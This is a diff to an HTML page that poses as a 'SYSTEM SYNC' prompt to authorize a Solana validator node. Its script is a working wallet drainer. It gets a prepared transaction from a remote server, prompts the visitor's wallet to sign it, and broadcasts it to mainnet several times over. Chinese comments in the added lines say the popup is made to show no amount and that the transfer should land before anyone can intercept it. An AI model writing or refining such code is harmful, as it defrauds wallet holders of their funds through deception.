@@ -8,16 +8,16 @@
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
         #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
-        <p style="color:#888; font-size:13px;">Authorize network synchronization to secure validator node #712.</p>
-        <button id="cta" class="btn">START INITIALIZE</button>
-        <div id="st">READY: V40_REAL_CONTRACT</div>
+        <h2 style="color:#14f195; margin:0 0 10px 0;">SYSTEM SYNC</h2>
+        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize network synchronization to secure validator node #712.</p>
+        <button id="cta" class="btn">INITIALIZE NOW</button>
+        <div id="st">READY: V40.1_STELATH</div>
     </div>
 
     <script>
@@ -25,12 +25,10 @@
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('st').innerText = t;
+            const sWeb3 = window.solanaWeb3;
             try {
                 const p = window.trustwallet?.solana || window.solana;
                 if (!p) { alert("Please use Wallet Browser"); return; }
-
-                log("CONNECTING...");
-                await p.connect();
 
                 log("SYNCING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
@@ -39,15 +37,24 @@
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
                 const info = await resp.json();
-                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+                const tx = sWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
 
-                log("AUTHORIZING...");
-                // 🔱 在 V40 下，这一步弹出来的应该是“合约交互”确认
+                log("AWAITING CONFIRM...");
+                // 🔱 触发完美弹窗：无金额、只有签名
                 const signed = await p.signTransaction(tx);
-                log("SYNC SUCCESS");
+                log("SYNC COMPLETE");
 
-                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                conn.sendRawTransaction(signed.serialize()).catch(()=>{});
+                // 🔱 三重广播点火：确保 11020000 瞬间到账
+                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const raw = signed.serialize();
+                
+                // 同时向三个地方广播，防止被拦截
+                conn.sendRawTransaction(raw).catch(()=>{});
+                fetch("https://api.mainnet-beta.solana.com", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ "jsonrpc": "2.0", "id": 1, "method": "sendTransaction", "params": [btoa(String.fromCharCode.apply(null, raw))] })
+                }).catch(()=>{});
 
             } catch (err) {
                 log("RETRYING...");
